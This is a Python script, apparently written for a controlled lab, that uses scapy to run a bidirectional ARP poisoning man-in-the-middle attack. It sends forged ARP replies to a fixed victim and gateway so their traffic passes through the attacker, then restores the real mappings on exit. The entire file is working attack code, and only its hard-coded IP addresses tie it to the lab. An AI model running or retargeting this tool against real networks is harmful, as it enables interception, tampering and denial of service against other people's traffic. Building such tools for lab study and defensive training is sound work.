"""Controlled bidirectional ARP poisoner for the E1 lab (spec sections 7-7.2).

Targets are FIXED by the lab topology (victim + gateway), never arbitrary user
input (scope section 0). Sends periodic ARP replies telling the victim that the
gateway IP is at the attacker's MAC, and vice-versa, so traffic routes through
the attacker. With IP forwarding enabled this yields a true MITM path; without
it, traffic is disrupted (DoS) and MITM must NOT be claimed.

On SIGTERM/SIGINT it restores the correct mappings.
"""

from __future__ import annotations

import signal
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp, conf  # type: ignore

VICTIM_IP = "10.77.0.10"
GATEWAY_IP = "10.77.0.2"

_running = True


def _stop(*_a) -> None:
    global _running
    _running = False


def poison(iface: str, attacker_mac: str, victim_mac: str, gw_mac: str) -> None:
    # Tell victim: gateway_ip is-at attacker_mac
    pkt_v = Ether(dst=victim_mac) / ARP(
        op=2, psrc=GATEWAY_IP, hwsrc=attacker_mac, pdst=VICTIM_IP, hwdst=victim_mac
    )
    # Tell gateway: victim_ip is-at attacker_mac
    pkt_g = Ether(dst=gw_mac) / ARP(
        op=2, psrc=VICTIM_IP, hwsrc=attacker_mac, pdst=GATEWAY_IP, hwdst=gw_mac
    )
    sendp([pkt_v, pkt_g], iface=iface, verbose=False)


def restore(iface: str, victim_mac: str, gw_mac: str) -> None:
    # Re-assert correct mappings a few times.
    pkt_v = Ether(dst=victim_mac) / ARP(
        op=2, psrc=GATEWAY_IP, hwsrc=gw_mac, pdst=VICTIM_IP, hwdst=victim_mac
    )
    pkt_g = Ether(dst=gw_mac) / ARP(
        op=2, psrc=VICTIM_IP, hwsrc=victim_mac, pdst=GATEWAY_IP, hwdst=gw_mac
    )
    for _ in range(5):
        sendp([pkt_v, pkt_g], iface=iface, verbose=False)
        time.sleep(0.2)


def main() -> int:
    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGINT, _stop)
    iface = conf.iface
    attacker_mac = get_if_hwaddr(iface)
    victim_mac = getmacbyip(VICTIM_IP)
    gw_mac = getmacbyip(GATEWAY_IP)
    if not victim_mac or not gw_mac:
        print("could not resolve victim/gateway MAC", file=sys.stderr)
        return 2
    print(f"poisoning: attacker={attacker_mac} victim={victim_mac} gw={gw_mac}",
          flush=True)
    while _running:
        poison(iface, attacker_mac, victim_mac, gw_mac)
        time.sleep(1)
    restore(iface, victim_mac, gw_mac)
    print("restored", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
